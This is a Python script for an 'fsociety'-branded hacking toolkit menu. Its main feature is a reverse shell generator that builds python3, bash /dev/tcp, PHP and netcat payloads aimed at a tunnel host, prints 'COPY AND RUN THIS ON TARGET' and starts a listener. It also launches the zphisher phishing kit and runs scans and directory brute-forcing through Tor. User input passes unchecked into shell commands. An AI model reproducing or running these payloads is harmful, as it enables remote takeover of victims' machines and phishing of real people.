import os
import socket
import datetime
import getpass

# تعريف الألوان لجمالية الواجهة
RED    = "\033[91m"
ORANGE = "\033[38;5;208m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
BLUE   = "\033[94m"
PURPLE = "\033[95m"
WHITE  = "\033[97m"
RESET  = "\033[0m"

# إعداد كلمة السر
MY_PASSWORD = "fsociety" 

def login():
    os.system('clear')
    print(f"{RED}")
    print("      [ LOGIN SYSTEM ]      ")
    print("----------------------------")
    
    attempts = 3
    while attempts > 0:
        user_input = getpass.getpass(f"{YELLOW}Enter Password to unlock: {RESET}")
        
        if user_input == MY_PASSWORD:
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"{GREEN}[+] Access Granted! Welcome, Youssef.")
            print(f"[+] Login Time: {now}{RESET}")
            os.system("sleep 1.5")
            return True
        else:
            attempts -= 1
            print("\a", end="") 
            print(f"{RED}[!] Incorrect Password! Attempts left: {attempts}{RESET}")
            
    print(f"{RED}[!!!] Security Alert: Unauthorized access attempt!{RESET}")
    return False

if not login():
    exit()

# القائمة الرئيسية للأدوات
while True:
    os.system('clear')

    print(RED    + "    ______                  _      _                " + RESET)
    print(ORANGE + "   |  ____|                (_)    | |               " + RESET)
    print(YELLOW + "   | |__ ___  ___  ___ _  ___| |_ _   _            " + RESET)
    print(GREEN  + "   |  __/ __|/ _ \ / __| |/ _ \ __| | | |         " + RESET)
    print(BLUE   + "   | |  \__ \ (_) | (__| |  __/ |_| |_| |         " + RESET)
    print(PURPLE + "   |_|  |___/\___/ \___|_|\___|\__|\__, |         " + RESET)
    print(RED    + "                                    __/ |         " + RESET)
    print(ORANGE + "          MADE BY YOUSSEF           |___/         " + RESET)
    
    print(f"{PURPLE}--------------------------------------------------{RESET}")
    print(f"{GREEN} 1. Show exploits in websites {RESET}")
    print(f"{ORANGE} 2. Show IP of websites {RESET}")
    print(f"{BLUE} 3. Make Global Payload & Run Listener {RESET}")
    print(f"{YELLOW} 4. Show information for picture  {RESET}")
    print(f"{GREEN} 5. Hide/Encrypt files  {RESET}")
    print(f"{PURPLE} 6. Show paths for websites  {RESET}")
    print(f"{RED} 7. OSINT Search  {RESET}")
    print(f"{BLUE} 8. Setup All Tools {RESET}")
    print(f"{ORANGE} 9. Decode File IMG  {RESET}")
    print(f"{BLUE} 10. Show GPS Any IP {RESET}")
    print(f"{YELLOW} 11. Scan IPs in Network {RESET}")
    print(f"{GREEN} 12. Tor Service Manager {RESET}")
    print(f"{PURPLE} 13. Make Phishing Link {RESET}")
    print(f"{RED} 0. Exit {RESET}")

    choice = input(f"\n{YELLOW}Fsociety@root~$ {RESET}")

    if choice == "1":
        target = input("Enter IP Target: ")
        os.system(f"sudo proxychains4 nmap -Pn {target} | grep 'tcp' ")
        input(f"\n{GREEN}Press Enter to return...{RESET}")

    elif choice == "2":
        domain = input(f"{ORANGE}Enter website to show IP: {RESET}")
        try:
            ip = socket.gethostbyname(domain)
            print(f"\n{GREEN}[+] Domain: {domain}")
            print(f"[+] IP Address: {ip}{RESET}")
        except:
            print(f"\n{RED}[!] Error: Could not find IP.{RESET}")
        input(f"\n{GREEN}Press Enter to return...{RESET}")

    elif choice == "3":
        os.system('clear')
        print(f"{RED}[!] GLOBAL REVERSE SHELL GENERATOR [!]{RESET}")
        
        print(f"{BLUE}--- [ STEP 1: TUNNEL INFO ] ---{RESET}")
        print(f"{WHITE}Hint: Run 'ssh -p 443 -R0:localhost:8888 tcp@a.pinggy.io' in another tab{RESET}")
        addr = input(f"{YELLOW}Enter Tunnel Address (e.g. xxxxx.pinggy.link): {RESET}")
        port = input(f"{YELLOW}Enter Tunnel Port (e.g. 37151): {RESET}")
        
        print(f"\n{BLUE}--- [ STEP 2: CHOOSE PAYLOAD TYPE ] ---{RESET}")
        print(f"{GREEN}1. Python3 (Best for Cloud Shell/Linux){RESET}")
        print(f"{GREEN}2. Bash Standard (Simple Linux){RESET}")
        print(f"{GREEN}3. PHP (For Web Servers){RESET}")
        print(f"{GREEN}4. Netcat Traditional (nc -e){RESET}")
        
        pay_choice = input(f"\n{YELLOW}Select (1-4): {RESET}")
        
        payload = ""
        if pay_choice == "1":
            payload = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{addr}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        elif pay_choice == "2":
            payload = f"bash -i >& /dev/tcp/{addr}/{port} 0>&1"
        elif pay_choice == "3":
            payload = f"php -r '$sock=fsockopen(\"{addr}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
        elif pay_choice == "4":
            payload = f"nc -e /bin/bash {addr} {port}"

        print(f"\n{RED}[!!!] COPY AND RUN THIS ON TARGET [!!!]{RESET}")
        print(f"{PURPLE}--------------------------------------------------{RESET}")
        print(f"{WHITE}{payload}{RESET}")
        print(f"{PURPLE}--------------------------------------------------{RESET}")
        
        print(f"\n{ORANGE}[*] Starting Netcat Listener on Local Port 8888...{RESET}")
        print(f"{BLUE}[!] Waiting for connection from {addr}:{port}...{RESET}")
        os.system(f"sudo nc -lvnp 8888")
        input(f"\n{GREEN}Press Enter to return...{RESET}")

    elif choice == "4":
        s = input("Enter file picture (.png/.jpg): ")
        os.system(f"sudo proxychains4 exiftool {s}")
        input(f"\n{GREEN}Press Enter...{RESET}")

    elif choice == "5":
        g = input("Enter the picture: ")
        q = input("Enter the file secret: ")
        os.system(f"sudo proxychains4 steghide embed -cf {g} -ef {q}")
        input(f"\n{GREEN}Done! Press Enter...{RESET}")

    elif choice == "6":
        d = input("Enter website for Dirb: ")
        os.system(f"sudo proxychains4 dirb {d}")
        input(f"\n{GREEN}Press Enter...{RESET}")

    elif choice == "7":
        ic = input("Enter UserName for Sherlock: ")
        os.system(f"sudo proxychains4 sherlock {ic}") 
        input(f"\n{GREEN}Press Enter...{RESET}")

    elif choice == "8":
        print(f"{YELLOW}[*] Updating and Installing All Tools...{RESET}")
        os.system("sudo apt update && sudo apt install nmap steghide dirb tor proxychains4 netcat-traditional exiftool netdiscover -y")
        os.system("python3 -m pip install sherlock-project")
        os.system("git clone https://github.com/htr-tech/zphisher")
        input(f"\n{GREEN}All tools are installed! Press Enter...{RESET}")

    elif choice == "9":
        img = input(f"{ORANGE}Enter picture: {RESET}")
        os.system(f"sudo proxychains4 steghide extract -sf {img}")
        input(f"\n{GREEN}Press Enter...{RESET}")

    elif choice == "10":
        ip_track = input(f"{BLUE}Enter IP: {RESET}")
        os.system(f"sudo proxychains4 curl -s http://ip-api.com/json/{ip_track} | python3 -m json.tool")
        input(f"\n{GREEN}Press Enter...{RESET}")

    elif choice == "11":
        print(f"{YELLOW}[*] Detecting live devices on your WiFi...{RESET}")
        os.system("sudo nmap -sn 192.168.1.0/24 | grep -E 'Nmap scan report for|MAC Address'")
        input(f"\n{GREEN}Scan Finished! Press Enter to return...{RESET}")

    elif choice == "12":
        print(f"{BLUE}[*] Tor Control Panel{RESET}")
        print("1. Turn ON Tor")
        print("2. Check Tor Status")
        tor_choice = input(f"{YELLOW}Select (1/2): {RESET}")
        if tor_choice == "1":
            os.system("sudo systemctl start tor")
            print(f"{GREEN}[+] Tor started! Use options with proxychains now.{RESET}")
        elif tor_choice == "2":
            os.system("sudo service tor status")
        input(f"\n{GREEN}Press Enter to return...{RESET}")

    elif choice == "13":
        os.system("bash zphisher/zphisher.sh")
        input(f"\n{GREEN}Phishing is done! Press Enter to return...{RESET}")

    elif choice == "0":
        print(f"{PURPLE}Goodbye Friend... fsociety.{RESET}")
        break

    else:
        print(f"{RED}Invalid choice!{RESET}")
        os.system("sleep 1")
